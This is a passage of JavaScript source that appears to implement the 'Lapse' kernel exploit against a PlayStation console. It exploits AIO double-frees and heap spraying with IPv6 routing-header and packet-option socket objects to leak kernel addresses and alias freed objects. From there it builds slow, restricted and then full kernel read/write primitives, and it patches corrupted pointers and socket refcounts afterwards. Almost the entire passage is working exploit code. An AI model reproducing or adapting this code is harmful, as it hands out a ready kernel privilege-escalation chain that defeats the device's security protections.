        wbuf.put32(reqs3Offset + 0x08, AIO_STATE_COMPLETE);
        wbuf.put8(reqs3Offset + 0x0C, 0);
        wbuf.put32(reqs3Offset + 0x28, 0x067B0000);
        wbuf.put64(reqs3Offset + 0x38, 1);

        var numElems = 6;
        var ucred = kbufAddr.add32(4);
        var leakReqs = this.makeReqs1(numElems);
        leakReqs.put64(0x10, ucred);

        var numLoop = this.sds.length;
        var leakIdsLen = numLoop * numElems;
        var leakIdsBuf = this.alloc(4 * leakIdsLen, 4, "lapse-leak-ids");

        var reqs2Off = -1;
        var fakeReqs3Off = -1;
        var fakeReqs3Sd = -1;
        var fakeReqs3Index = -1;
        var fakeReqs3MarkerIndex = -1;

        var buflen = config.rthdrSize * config.leakRecords;
        var bigBuf = this.alloc(buflen, 8, "lapse-leak-bigbuf");
        var maxLeakSize = 0;
        var reqs2Rounds = 0;
        var fakeReqs3Rounds = 0;
        this.checkpoint("leak-spray", "Searching adjacent AIO/rthdr objects");

        for (var i = 1; i <= config.leakRounds; ++i) {
            for (var j = 0; j < numLoop; ++j) {
                wbuf.put32(8, j + 1);
                var idsSub = leakIdsBuf.sub(j * numElems * 4,
                    4 * numElems, "leak-ids-" + j);
                var submitResult = this.aioSubmitCmd(AIO_CMD_MULTI_WRITE,
                    leakReqs, numElems, 3, idsSub);
                if (submitResult !== 0)
                    throw new Error("lapse: leak AIO submit failed round="
                        + i + " socket=" + j + " result=" + submitResult);
                this.setRthdr(this.sds[j], wbuf, rsize);
            }

            bigBuf.fill(0);
            var leakSize = this.getRthdr(sd, bigBuf, buflen);
            if (leakSize > maxLeakSize) maxLeakSize = leakSize;

            reqs2Off = -1;
            fakeReqs3Off = -1;
            fakeReqs3Sd = -1;
            fakeReqs3Index = -1;
            fakeReqs3MarkerIndex = -1;

            // Match the PS5 reference: scan the complete zeroed destination rather
            // than treating the returned socklen as an authoritative copy
            // boundary.  This is a forged/OOB object, so the references do not
            // use its reported length as a validation signal.  Zero-filling
            // keeps uncopied records inert, and every access remains inside
            // the allocated 0x800 buffer.
            for (var off = config.rthdrSize;
                    off < buflen; off += config.rthdrSize) {
                if (reqs2Off < 0 &&
                        this.verifyReqs2(bigBuf, off, AIO_CMD_WRITE))
                    reqs2Off = off;

                if (fakeReqs3Off < 0) {
                    var marker = bigBuf.get32(off + 4);
                    if (marker === markerVal) {
                        var sdIdx = bigBuf.get32(off + 8);
                        if (sdIdx > 0 && sdIdx <= numLoop) {
                            fakeReqs3Off = off;
                            fakeReqs3MarkerIndex = sdIdx;
                            fakeReqs3Index = sdIdx - 1;
                            fakeReqs3Sd = this.sds[fakeReqs3Index];
                        }
                    }
                }
            }

            if (reqs2Off >= 0) reqs2Rounds += 1;
            if (fakeReqs3Off >= 0) fakeReqs3Rounds += 1;

            if (reqs2Off >= 0 && fakeReqs3Off >= 0) {
                if (fakeReqs3Index < 0 || fakeReqs3Sd < 0)
                    throw new Error("lapse: fake reqs3 socket marker invalid");
                this.sds.splice(fakeReqs3Index, 1);
                this.freeRthdrs(this.sds);
                this.sds.push(this.newSocket());
                break;
            }

            this.freeAios(leakIdsBuf, leakIdsLen, true);
        }

        var leakDiag = this.attemptDiagnostics.leak;
        leakDiag.maxLength = maxLeakSize;
        leakDiag.reqs2Rounds = reqs2Rounds;
        leakDiag.fakeReqs3Rounds = fakeReqs3Rounds;

        if (reqs2Off < 0 || fakeReqs3Off < 0)
            throw new Error("lapse: failed to leak reqs2/fake_reqs3 after "
                + config.leakRounds + " rounds (maxLen=0x"
                + maxLeakSize.toString(16) + ", reqs2Rounds=" + reqs2Rounds
                + ", fakeReqs3Rounds=" + fakeReqs3Rounds + ")");

        leakDiag.selectedRound = i;
        leakDiag.reqs2Offset = reqs2Off;
        leakDiag.fakeReqs3Offset = fakeReqs3Off;

        bigBuf.fill(0);
        this.getRthdr(sd, bigBuf, buflen);
        this.validateLeakSnapshot(bigBuf, {
            buflen: buflen,
            reqs2Off: reqs2Off,
            fakeReqs3Off: fakeReqs3Off,
            markerValue: markerVal,
            markerIndex: fakeReqs3MarkerIndex,
            socketCount: numLoop,
            reqs3Offset: reqs3Offset
        });
        leakDiag.finalSnapshotVerified = true;

        var aioInfoAddr = bigBuf.get64(reqs2Off + 0x18);
        var rawReqs1Addr = bigBuf.get64(reqs2Off + 0x10);
        this.assertKernelPointer(rawReqs1Addr, "raw reqs1 address");
        var reqs1Addr = rawReqs1Addr.and(
            new U64(0xFFFFFF00, 0xFFFFFFFF));

        var fakeReqs3Addr = kbufAddr.add32(fakeReqs3Off + reqs3Offset);

        this.assertKernelPointer(aioInfoAddr, "aio_info address");
        this.assertKernelPointer(reqs1Addr, "reqs1 address");
        this.assertKernelPointer(fakeReqs3Addr, "fake reqs3 address");

        var targetId = -1;
        var remainingStart = leakIdsLen;
        var cancelErrs = this.alloc(4 * numElems, 4, "lapse-leak-cancel-errs");

        for (var i = 0; i < leakIdsLen; i += numElems) {
            var batch = leakIdsBuf.sub(i * 4, 4 * numElems,
                "leak-cancel-" + i);
            this.aioMultiCancel(batch, numElems, cancelErrs);
            bigBuf.fill(0);
            this.getRthdr(sd, bigBuf, buflen);
            this.validateLeakSnapshot(bigBuf, {
                buflen: buflen,
                reqs2Off: reqs2Off,
                fakeReqs3Off: fakeReqs3Off,
                markerValue: markerVal,
                markerIndex: fakeReqs3MarkerIndex,
                socketCount: numLoop,
                reqs3Offset: reqs3Offset,
                expectedReqs1: rawReqs1Addr,
                expectedAioInfo: aioInfoAddr
            });

            var state = bigBuf.get32(reqs2Off + 0x38);
            if (state === AIO_STATE_ABORTED) {
                targetId = leakIdsBuf.get32(i * 4);
                leakIdsBuf.put32(i * 4, 0);
                remainingStart = i + numElems;
                break;
            }
        }

        if (targetId < 0)
            throw new Error("lapse: target_id not found");
        if (targetId === 0)
            throw new Error("lapse: target_id is zero");

        // Earlier batches, including the target batch, were already cancelled
        // during the search. Only cancel the untouched tail, matching the
        // reference and avoiding a second cancellation of the corrupt entry.
        var remaining = leakIdsLen - remainingStart;
        if (remaining > 0)
            this.cancelAios(leakIdsBuf.sub(remainingStart * 4,
                remaining * 4, "lapse-leak-cancel-tail"), remaining);
        this.freeAios2(leakIdsBuf, leakIdsLen);

        var leaked = this.leakedAddrs;
        leaked.evf = evf;
        leaked.kernelAddr = kernelAddr;
        leaked.kbufAddr = kbufAddr;
        leaked.reqs1Addr = reqs1Addr;
        leaked.reqs2Off = reqs2Off;
        leaked.targetId = targetId;
        leaked.aioInfoAddr = aioInfoAddr;
        leaked.fakeReqs3Addr = fakeReqs3Addr;
        leaked.fakeReqs3Sd = fakeReqs3Sd;
        // Journal only numeric words after the fresh snapshot, cancellation
        // search, and AIO retirement. Publication remains deferred until the
        // referenced freed object has yielded a verified curproc.
        this.recordDeferredCheckpoint(DEFERRED_LEAK_OBJECTS,
            leakDiag.selectedRound, reqs2Off, fakeReqs3Off);
    };

    // =====================================================================
    // Stage 3: Second double-free (reqs1) and pktopts aliasing
    // =====================================================================

    LapseKernel.prototype.triggerSecondDoubleFree = function () {
        var config = this.config;
        var la = this.leakedAddrs;
        var sd = this.aliasedPair[0];

        var maxLeakLen = (0xFF + 1) << 3;
        var buf = this.alloc(maxLeakLen, 8, "lapse-df1-buf");

        var numElems = config.maxAioIds;
        var aioReqs = this.makeReqs1(numElems);

        var numBatches = 2;
        var aioIdsLen = numBatches * numElems;
        var aioIdsBuf = this.alloc(4 * aioIdsLen, 4, "lapse-df1-ids");

        var aioNotFound = true;
        var evfDeleteResult = this.callI32("native.exports.evfDelete",
            [la.evf]);
        if (evfDeleteResult !== 0)
            throw new Error("lapse: evf delete failed " + evfDeleteResult);

        for (var i = 0; i < config.clobberAttempts; ++i) {
            this.sprayAio(numBatches, aioReqs, numElems, aioIdsBuf, true);

            buf.fill(0);
            var sizeRet = this.getRthdr(sd, buf, maxLeakLen);
            var cmd = buf.get32(0);

            if (sizeRet === 8 && cmd === AIO_CMD_READ) {
                aioNotFound = false;
                this.cancelAios(aioIdsBuf, aioIdsLen);
                break;
            }

            this.freeAios(aioIdsBuf, aioIdsLen, true);
        }

        if (aioNotFound)
            throw new Error("lapse: failed to overwrite rthdr with AIO");

        var reqs2Buf = this.alloc(config.rthdrSize, 8, "lapse-reqs2");
        var rsize = this.buildRthdr(reqs2Buf, config.rthdrSize);

        reqs2Buf.put32(4, 5);
        reqs2Buf.put64(0x18, la.reqs1Addr);
        reqs2Buf.put64(0x20, la.fakeReqs3Addr);

        var states = this.alloc(4 * numElems, 4, "lapse-df1-states");

        this.closeStrict(sd, "corrupt rthdr socket");
        this.aliasedPair[0] = -1;

        var reqId = -1;
        for (var i = 0; i < config.aliasAttempts; ++i) {
            for (var j = 0; j < this.sds.length; ++j)
                this.setRthdr(this.sds[j], reqs2Buf, rsize);

            for (var batch = 0; batch < numBatches; ++batch) {
                for (var j = 0; j < numElems; ++j)
                    states.put32(j * 4, 0xFFFFFFFF);

                var batchSub = aioIdsBuf.sub(batch * numElems * 4,
                    4 * numElems, "df1-batch-" + batch);
                this.aioMultiCancel(batchSub, numElems, states);

                var reqIdx = -1;
                for (var j = 0; j < numElems; ++j) {
                    if (states.get32(j * 4) === AIO_STATE_COMPLETE) {
                        reqIdx = j;
                        break;
                    }
                }

                if (reqIdx >= 0) {
                    var aioIdx = batch * numElems + reqIdx;
                    var reqIdBuf = aioIdsBuf.sub(aioIdx * 4, 4, "df1-req-id");
                    reqId = reqIdBuf.get32(0);
                    if (reqId === 0)
                        throw new Error("lapse: corrupt AIO request ID is zero");
                    this.aioMultiPoll(reqIdBuf, 1, states);
                    reqIdBuf.put32(0, 0);
                    break;
                }
            }
            if (reqId >= 0) break;
        }

        if (reqId < 0) {
            this.freeAios2(aioIdsBuf, aioIdsLen);
            throw new Error("lapse: failed to overwrite AIO with rthdr");
        }

        this.freeAios2(aioIdsBuf, aioIdsLen);

        var targetIdBuf = this.alloc(4, 4, "lapse-df1-target");
        targetIdBuf.put32(0, la.targetId);
        this.aioMultiPoll(targetIdBuf, 1, states);

        var sceErrs = this.alloc(8, 4, "lapse-df1-errs");
        sceErrs.put32(0, 0xFFFFFFFF);
        sceErrs.put32(4, 0xFFFFFFFF);

        var targetIds = this.alloc(8, 4, "lapse-df1-target-ids");
        targetIds.put32(0, reqId);
        targetIds.put32(4, la.targetId);

        // LAPSE_AIO_INFO_SENSITIVE_BEGIN: the paired delete below retires the
        // aio_info later used for the verified curproc walk. Until the matching
        // END marker, observability stays in preallocated numeric storage.
        this.aioMultiDelete(targetIds, 2, sceErrs);

        var pktoptsPair = this.makeAliasedPktopts(this.sdsAlt);

        states.put32(0, 0xFFFFFFFF);
        states.put32(4, 0xFFFFFFFF);
        this.aioMultiPoll(targetIds, 2, states);
        if (states.get32(0) !== SCE_KERNEL_ERROR_ESRCH)
            throw new Error("lapse: bad delete of corrupt AIO request");

        var err1 = sceErrs.get32(0);
        var err2 = sceErrs.get32(4);
        if (err1 !== 0 || err1 !== err2)
            throw new Error("lapse: bad delete of ID pair");

        if (!pktoptsPair)
            throw new Error("lapse: pktopts aliasing failed");

        this.closeStrict(la.fakeReqs3Sd, "fake reqs3 socket");
        la.fakeReqs3Sd = -1;

        this.aliasedPair = pktoptsPair;
    };

    LapseKernel.prototype.makeAliasedPktopts = function (fds) {
        var c = this.c;
        var tclassBuf = this.alloc(4, 4, "lapse-tclass");

        for (var loop = 0; loop < this.config.aliasAttempts; ++loop) {
            for (var i = 0; i < fds.length; ++i) {
                tclassBuf.put32(0, i);
                this.setSockopt(fds[i], c.ipprotoIpv6, c.ipv6Tclass,
                    tclassBuf, 4);
            }

            for (var i = 0; i < fds.length; ++i) {
                tclassBuf.fill(0);
                var tclassSize = this.getSockopt(fds[i], c.ipprotoIpv6,
                    c.ipv6Tclass, tclassBuf, 4);
                if (tclassSize !== 4)
                    throw new Error("lapse: short tclass marker "
                        + tclassSize);
                var marker = tclassBuf.get32(0);

                if (marker !== i) {
                    if (marker >= fds.length)
                        throw new Error("lapse: pktopts marker out of range "
                            + marker + "/" + fds.length);
                    var pair = this.pktoptsPair;
                    pair[0] = fds[i];
                    pair[1] = fds[marker];
                    var outputIndex = 0;
                    for (var inputIndex = 0; inputIndex < fds.length;
                            ++inputIndex) {
                        if (inputIndex !== i && inputIndex !== marker) {
                            fds[outputIndex] = fds[inputIndex];
                            outputIndex += 1;
                        }
                    }
                    var s1 = this.newSocket();
                    this.setSockopt(s1, c.ipprotoIpv6, c.ipv6Tclass,
                        tclassBuf, 4);
                    var s2 = this.newSocket();
                    this.setSockopt(s2, c.ipprotoIpv6, c.ipv6Tclass,
                        tclassBuf, 4);
                    fds[outputIndex] = s1;
                    fds[outputIndex + 1] = s2;
                    fds.length = outputIndex + 2;
                    return pair;
                }
            }

            for (var i = 0; i < fds.length; ++i)
                this.setSockopt(fds[i], c.ipprotoIpv6,
                    IPV6_2292PKTOPTIONS, 0, 0);
        }
        return null;
    };

    // =====================================================================
    // Stage 4: Bootstrap kernel R/W
    // =====================================================================

    LapseKernel.prototype.bootstrapKernelRw = function () {
        var c = this.c;
        var la = this.leakedAddrs;
        var masterSock = this.aliasedPair[0];
        if (masterSock < 0)
            throw new Error("lapse: missing pktopts master socket");

        var pktoptsSize = 0x100;
        var pktoptsBuf = this.alloc(pktoptsSize, 8, "lapse-pktopts");
        var rsize = this.buildRthdr(pktoptsBuf, pktoptsSize);
        var pktinfoP = la.reqs1Addr.add32(0x10);

        pktoptsBuf.put64(0x10, pktinfoP);

        this.closeStrict(this.aliasedPair[1], "aliased pktopts peer");
        this.aliasedPair[1] = -1;

        var reclaimSock = -1;
        var tclassBuf = this.alloc(4, 4, "lapse-arw-tclass");
        for (var loop = 1; loop <= this.config.aliasAttempts; ++loop) {
            for (var j = 0; j < this.sdsAlt.length; ++j) {
                pktoptsBuf.put32(0xC0, 0x4141 | (j << 16));
                this.setRthdr(this.sdsAlt[j], pktoptsBuf, rsize);
            }
            tclassBuf.fill(0);
            var tclassSize = this.getSockopt(masterSock, c.ipprotoIpv6,
                c.ipv6Tclass,
                tclassBuf, 4);
            if (tclassSize !== 4)
                throw new Error("lapse: short reclaim marker " + tclassSize);
            var marker = tclassBuf.get32(0);
            if ((marker & 0xFFFF) === 0x4141) {
                var idx = (marker >>> 16) & 0xFFFF;
                if (idx >= this.sdsAlt.length)
                    throw new Error("lapse: reclaim marker out of range "
                        + idx + "/" + this.sdsAlt.length);
                reclaimSock = this.sdsAlt[idx];
                for (var move = idx; move + 1 < this.sdsAlt.length; ++move)
                    this.sdsAlt[move] = this.sdsAlt[move + 1];
                this.sdsAlt.length -= 1;
                break;
            }
        }

        if (reclaimSock < 0)
            throw new Error("lapse: pktopts overwrite failed");
        this.recordDeferredCheckpoint(DEFERRED_RW_RECLAIMED, 0, 0, 0);

        var pktinfoLen = 0x14;
        var pktinfoBuf = this.alloc(pktinfoLen, 8, "lapse-pktinfo");
        pktinfoBuf.put64(0, pktinfoP);

        var readBuf = this.alloc(8, 8, "lapse-arw-read");

        var self = this;
        var nexthopLen = this.alloc(4, 4, "lapse-nexthop-len");

        function slowKread8(addr) {
            self.assertKernelPointer(addr, "slow-read address");
            readBuf.fill(0);
            var offset = 0;
            while (offset < 8) {
                pktinfoBuf.put64(8, addr.add32(offset));
                self.setSockopt(masterSock, c.ipprotoIpv6, c.ipv6Pktinfo,
                    pktinfoBuf, pktinfoLen);
                var remaining = 8 - offset;
                nexthopLen.put32(0, remaining);
                var getResult = self.callI32("native.exports.getsockopt",
                    [masterSock, c.ipprotoIpv6, c.ipv6Nexthop,
                        readBuf.address + offset, nexthopLen.address]);
                if (getResult !== 0)
                    throw new Error("lapse: slow kernel read failed "
                        + getResult);
                var n = nexthopLen.get32(0);
                if (n > remaining)
                    throw new Error("lapse: slow kernel read overflow "
                        + n + "/" + remaining);
                if (n === 0) {
                    readBuf.put8(offset, 0);
                    offset += 1;
                } else {
                    offset += n;
                }
            }
            return readBuf.get64(0);
        }

        this.deferredCheckpointStageCode = DEFERRED_RW_SLOW_CANARY;
        slowKread8(la.kernelAddr);
        if (readBuf.get32(0) !== 0x20667665
                || (readBuf.get32(4) & 0xFFFF) !== 0x7663)
            throw new Error("lapse: slow_kread8 static canary failed");

        var stride = this.off("kernel.structures.filedescentSize");
        var curproc = this.resolvePidVerifiedCurproc(
            slowKread8, la.aioInfoAddr, this.currentPid);

        this.curproc = curproc;
        resolveFileTableSlow();
        // LAPSE_AIO_INFO_SENSITIVE_END: curproc, PID, p_fd, descriptor table,
        // capacity, and descriptor entries have all passed semantic checks.
        // aio_info is no longer needed. Publish the milestones deliberately
        // withheld from the freed-object window, then attest the complete
        // semantic chain before allocating the worker socket.
        this.deferredCheckpointPublishSafe = true;
        this.materializeSlowCurprocDiagnostics();
        this.publishDeferredCheckpoints();
        this.checkpoint("rw-slow-canary",
            "Slow kernel read, curproc and file table verified attempts="
            + this.attemptDiagnostics.slowCurproc.attempts, true);

        var workerSock = this.newSocket();
        var workerPktinfo = this.alloc(pktinfoLen, 8, "lapse-worker-pktinfo");

        this.setSockopt(workerSock, c.ipprotoIpv6, c.ipv6Pktinfo,
            workerPktinfo, pktinfoLen);

        var soPcb = 0x18;
        var inpcbPktopts = this.off("kernel.structures.in6pOutputopts");

        function resolveFileTableSlow() {
            return self.refreshFileTableWith(slowKread8, "slow");
        }

        function getFdDataAddr(fd) {
            if (!Number.isInteger(fd) || fd < 0)
                throw new Error("lapse: invalid fd " + fd);
            var table = resolveFileTableSlow();
            if (fd >= table.capacity)
                throw new Error("lapse: fd " + fd
                    + " exceeds descriptor-table capacity " + table.capacity);
            var fde = table.entries.add32(fd * stride);
            var fp = slowKread8(fde);
            self.assertKernelPointer(fp, "file pointer for fd " + fd);
            var data = slowKread8(fp);
            return self.assertKernelPointer(data,
                "file data for fd " + fd);
        }

        function getSockPktopts(fd) {
            var fdData = getFdDataAddr(fd);
            var pcb = slowKread8(fdData.add32(soPcb));
            self.assertKernelPointer(pcb, "PCB for fd " + fd);
            var pktopts = slowKread8(pcb.add32(inpcbPktopts));
            return self.assertKernelPointer(pktopts,
                "pktopts for fd " + fd);
        }

        var workerPktopts = getSockPktopts(workerSock);

        pktinfoBuf.put64(0, workerPktopts.add32(0x10));
        pktinfoBuf.put64(8, 0);
        this.setSockopt(masterSock, c.ipprotoIpv6, c.ipv6Pktinfo,
            pktinfoBuf, pktinfoLen);

        var kread20Len = this.alloc(4, 4, "lapse-kread20-len");

        function kread20(addr, buf) {
            self.assertKernelPointer(addr, "restricted-read address");
            pktinfoBuf.put64(0, addr);
            self.setSockopt(masterSock, c.ipprotoIpv6, c.ipv6Pktinfo,
                pktinfoBuf, pktinfoLen);
            buf.fill(0);
            kread20Len.put32(0, pktinfoLen);
            var result = self.callI32("native.exports.getsockopt",
                [workerSock, c.ipprotoIpv6, c.ipv6Pktinfo,
                    buf.address, kread20Len.address]);
            if (result !== 0)
                throw new Error("lapse: restricted kernel read failed "
                    + result);
            var actual = kread20Len.get32(0);
            if (actual !== pktinfoLen)
                throw new Error("lapse: restricted kernel read shortened "
                    + actual + "/" + pktinfoLen);
        }

        function kread8(addr) {
            kread20(addr, workerPktinfo);
            return workerPktinfo.get64(0);
        }

        function restrictedKwrite8(addr, val) {
            self.assertKernelPointer(addr, "restricted-write address");
            workerPktinfo.put64(0, val);
            workerPktinfo.put64(8, 0);
            workerPktinfo.put32(0x10, 0);
            pktinfoBuf.put64(0, addr);
            self.setSockopt(masterSock, c.ipprotoIpv6, c.ipv6Pktinfo,
                pktinfoBuf, pktinfoLen);
            self.setSockopt(workerSock, c.ipprotoIpv6, c.ipv6Pktinfo,
                workerPktinfo, pktinfoLen);
        }

        kread8(la.kernelAddr);
        if (workerPktinfo.get32(0) !== 0x20667665
                || (workerPktinfo.get32(4) & 0xFFFF) !== 0x7663)
            throw new Error("lapse: restricted kread static canary failed");
        this.checkpoint("rw-restricted-canary",
            "Restricted kernel read verified", true);

        function resolveFileTableRestricted() {
            return self.refreshFileTableWith(kread8, "restricted");
        }

        this.ipv6Rw = new NS.Ipv6KernelRw({
            bridge: this.bridge,
            allocator: this.allocator,
            memory: this.memory,
            profile: this.profile,
            filedesc: this.curprocFd,
            table: this.fdt,
            ofiles: this.fdtOfiles,
            capacity: this.attemptDiagnostics.fileTable.capacity,
            kread8: kread8,
            kwrite8: restrictedKwrite8,
            // Descriptor allocation can replace either p_fd or its
            // variable-sized table. The slow reader is no longer valid after
            // the worker overlap, so resolve through restricted kread8.
            resolveFileTable: resolveFileTableRestricted
        });
        this.checkpoint("rw-full-init",
            "Creating pipe-backed full kernel R/W", true);
        this.ipv6Rw.init();
        this.curprocFd = this.ipv6Rw.filedesc;
        this.fdt = this.ipv6Rw.fdt;
        this.fdtOfiles = this.ipv6Rw.ofiles;
        this.attemptDiagnostics.fileTable.capacity = this.ipv6Rw.fdtNfiles;
        this.checkpoint("rw-pipe-ready", "Pipe fds="
            + this.ipv6Rw.pipeReadFd + "/" + this.ipv6Rw.pipeWriteFd
            + " tableCapacity=" + this.ipv6Rw.fdtNfiles
            + " tableMoves=" + this.ipv6Rw.fdtRelocations
            + " fdMoves=" + this.ipv6Rw.filedescRelocations
            + " resolver=" + this.attemptDiagnostics.fileTable.lastReader
            + " restrictedRefreshes="
            + this.attemptDiagnostics.fileTable.restrictedRefreshes, true);

        var ip6poRthdr = this.off("kernel.structures.ip6poRthdr");
        var rw = this.ipv6Rw;

        var fullStringBytes = rw.read(la.kernelAddr, 8);
        var fullString = "";
        for (var i = 0; i < fullStringBytes.length
                && fullStringBytes[i] !== 0; ++i)
            fullString += String.fromCharCode(fullStringBytes[i]);
        if (fullString !== "evf cv")
            throw new Error("lapse: full kernel R/W test failed, got \""
                + fullString + "\"");
        this.checkpoint("rw-full-canary", "Full kernel R/W verified", true);

        function getFdDataAddrFast(fd) {
            if (!Number.isInteger(fd) || fd < 0)
                throw new Error("lapse: invalid fast-R/W fd " + fd);
            var table = self.resolveFileTable();
            if (fd >= table.capacity)
                throw new Error("lapse: fast-R/W fd " + fd
                    + " exceeds descriptor-table capacity " + table.capacity);
            var fde = table.entries.add32(fd * stride);
            var fp = rw.read64(fde);
            self.assertKernelPointer(fp, "fast file pointer for fd " + fd);
            var data = rw.read64(fp);
            return self.assertKernelPointer(data,
                "fast file data for fd " + fd);
        }
        function getSockPktoptsFast(fd) {
            var fdData = getFdDataAddrFast(fd);
            var pcb = rw.read64(fdData.add32(soPcb));
            self.assertKernelPointer(pcb, "fast PCB for fd " + fd);
            var pktopts = rw.read64(pcb.add32(inpcbPktopts));
            return self.assertKernelPointer(pktopts,
                "fast pktopts for fd " + fd);
        }
        var repairedSlots = new Set();
        function clearRthdrPointer(pktopts, label) {
            self.assertKernelPointer(pktopts, label + " pktopts");
            var slot = pktopts.add32(ip6poRthdr);
            var slotKey = slot.toHex();
            if (repairedSlots.has(slotKey))
                throw new Error("lapse: duplicate rthdr repair target "
                    + slotKey);
            repairedSlots.add(slotKey);
            var before = rw.read64(slot);
            if (!before.isZero() && !before.isKernelPointer())
                throw new Error("lapse: invalid " + label
                    + " rthdr pointer " + before.toHex());
            rw.write64(slot, U64.zero());
            if (!rw.read64(slot).isZero())
                throw new Error("lapse: failed to clear " + label
                    + " rthdr pointer");
            self.repairJournal.push({
                kind: "rthdr", label: label, address: slotKey,
                before: before.toHex(), after: U64.zero().toHex()
            });
        }

        for (var i = 0; i < this.sds.length; ++i)
            clearRthdrPointer(getSockPktoptsFast(this.sds[i]),
                "spray socket " + i);

        clearRthdrPointer(getSockPktoptsFast(reclaimSock),
            "reclaim socket");
        clearRthdrPointer(workerPktopts, "worker socket");

        var sockRefs = [
            rw.masterSock, rw.victimSock,
            masterSock, workerSock, reclaimSock
        ];
        this.restrictedTransportFds = [masterSock, workerSock, reclaimSock];
        var repairedSockets = new Set();
        for (var i = 0; i < sockRefs.length; ++i) {
            var socketAddress = getFdDataAddrFast(sockRefs[i]);
            var socketKey = socketAddress.toHex();
            if (repairedSockets.has(socketKey))
                throw new Error("lapse: duplicate socket refcount target "
                    + socketKey);
            repairedSockets.add(socketKey);
            var priorRefs = rw.read32(socketAddress);
            if (priorRefs === 0 || priorRefs >= 0x10000)
                throw new Error("lapse: invalid socket refcount " + priorRefs
                    + " for fd " + sockRefs[i]);
            rw.write32(socketAddress, 0x100);
            var observedRefs = rw.read32(socketAddress);
            if (observedRefs < 0xFF || observedRefs > 0x101)
                throw new Error("lapse: socket refcount write failed "
                    + observedRefs + " for fd " + sockRefs[i]);
            this.repairJournal.push({
                kind: "socket-ref", fd: sockRefs[i], address: socketKey,
                before: priorRefs, after: observedRefs
            });
        }

        var rthdrRepairs = 0;
        var socketRepairs = 0;
        for (var i = 0; i < this.repairJournal.length; ++i) {
            if (this.repairJournal[i].kind === "rthdr") rthdrRepairs += 1;
            if (this.repairJournal[i].kind === "socket-ref") socketRepairs += 1;
        }
        var expectedRthdrRepairs = this.sds.length + 2;
        if (rthdrRepairs !== expectedRthdrRepairs
                || socketRepairs !== sockRefs.length)
            throw new Error("lapse: incomplete repair journal rthdr="
                + rthdrRepairs + "/" + expectedRthdrRepairs + " refs="
                + socketRepairs + "/" + sockRefs.length);
        this.attemptDiagnostics.repair.rthdrSlots = rthdrRepairs;
        this.attemptDiagnostics.repair.socketRefs = socketRepairs;

        this.cleanupSafe = true;
        this.fast = true;
        this.checkpoint("rw-repaired", "Corrupt kernel pointers repaired", true);
    };

    // =====================================================================
    // Public kernel R/W interface (matches PoopsKernel)
    // =====================================================================

    LapseKernel.prototype.read = function (address, size) {
        if (!this.fast)
            throw new Error("lapse: kernel R/W not ready");
        return this.ipv6Rw.read(address, size);
    };

    LapseKernel.prototype.write = function (address, source) {
        if (!this.fast)
            throw new Error("lapse: kernel R/W not ready");
        this.ipv6Rw.write(address, source);
    };

    LapseKernel.prototype.read8 = function (addr) {
        return this.read(addr, 1)[0];
    };
    LapseKernel.prototype.read32 = function (addr) {
        return readU32LE(this.read(addr, 4), 0);
    };
    LapseKernel.prototype.read64 = function (addr) {
        return readU64LE(this.read(addr, 8), 0);
    };

    LapseKernel.prototype.write8 = function (addr, val) {
        this.write(addr, new Uint8Array([val & 0xff]));
    };
    LapseKernel.prototype.write32 = function (addr, val) {
        var b = new Uint8Array(4); writeU32LE(b, 0, val);
        this.write(addr, b);
    };
    LapseKernel.prototype.write64 = function (addr, val) {
        var b = new Uint8Array(8); writeU64LE(b, 0, val);
        this.write(addr, b);
    };

    LapseKernel.prototype.resolveFileTable = function () {
        if (!this.ipv6Rw || !this.ipv6Rw.ready)
            throw new Error("lapse: cannot resolve file table before full R/W");
        this.assertKernelPointer(this.curproc, "curproc for file-table refresh");
        var previousFiledesc = this.curprocFd;
        var previousFdt = this.fdt;
        var procFd = this.off("kernel.structures.procFd");
        var filedesc = this.ipv6Rw.read64(this.curproc.add32(procFd));
        this.assertKernelPointer(filedesc, "current curproc filedesc");
        var fdt = this.ipv6Rw.read64(filedesc);
        this.assertKernelPointer(fdt, "current descriptor table");
        var capacity = this.ipv6Rw.read32(fdt);
        if (capacity === 0 || capacity > 0x100000)
            throw new Error("lapse: invalid descriptor-table capacity "
                + capacity);
        var entries = fdt.add32(this.off("kernel.structures.fdtOfiles"));
        this.assertKernelPointer(entries, "current ofiles table");
        var resolved = this.ipv6Rw.applyFileTable({
            filedesc: filedesc,
            table: fdt,
            entries: entries,
            capacity: capacity
        });
        this.curprocFd = resolved.filedesc;
        this.fdt = resolved.table;
        this.fdtOfiles = resolved.entries;
        var diag = this.attemptDiagnostics.fileTable;
        diag.refreshes += 1;
        diag.fullRefreshes += 1;
        diag.lastReader = "full";
        diag.capacity = capacity;
        if (!previousFiledesc.isZero() && !previousFiledesc.eq(filedesc))
            diag.filedescRelocations += 1;
        if (!previousFdt.isZero() && !previousFdt.eq(fdt))
            diag.tableRelocations += 1;
        return resolved;
    };

    LapseKernel.prototype.refreshOfiles = function () {
        return this.resolveFileTable().capacity;
    };

    LapseKernel.prototype.fget = function (fd) {
        if (!Number.isInteger(fd) || fd < 0)
            throw new Error("lapse: invalid fget fd " + fd);
        var table = this.resolveFileTable();
        if (fd >= table.capacity)
            throw new Error("lapse: fget fd " + fd
                + " exceeds descriptor-table capacity " + table.capacity);
        var file = this.read64(table.entries.add32(
            fd * this.off("kernel.structures.filedescentSize")));
        return this.assertKernelPointer(file, "file pointer for fd " + fd);
    };

    LapseKernel.prototype.holdFile = function (fd) {
        var prior = null;
        for (var i = 0; i < this.fileHoldRecords.length; ++i) {
            if (this.fileHoldRecords[i].fd === fd) {
                prior = this.fileHoldRecords[i];
                break;
            }
        }
        if (prior) {
            if (prior.verified) return prior;
            throw new Error("fd " + fd + " prior refcount hold is unverified");
        }
        var file = this.fget(fd);
        if (!file.isKernelPointer())
            throw new Error("fd " + fd + " has invalid file pointer");
        var fileRefcount = this.off("kernel.structures.fileRefcount");
        var refs = this.read32(file.add32(fileRefcount));
        if (refs === 0 || refs >= 0x10000)
            throw new Error("fd " + fd + " bad refcount " + refs);
        var held = refs + 0x100;
        var record = { fd: fd, verified: false };
        this.fileHoldRecords.push(record);
        this.write32(file.add32(fileRefcount), held);
        var observed = this.read32(file.add32(fileRefcount));
        var delta = observed - held;
        var increase = observed - refs;
        if (delta < -1 || delta > 1 || increase < 0xff || increase > 0x101)
            throw new Error("fd " + fd + " refcount hold verification "
                + observed + "/" + held);
        record.verified = true;
        return record;
    };

    LapseKernel.prototype.seal = function () {
        if (this.sealed) return this.sealResult;
        if (!this.fast || !this.cleanupSafe || !this.cleanupDone || !this.ipv6Rw
                || !this.ipv6Rw.ready)
            throw new Error("lapse: seal requires repaired R/W and completed cleanup");
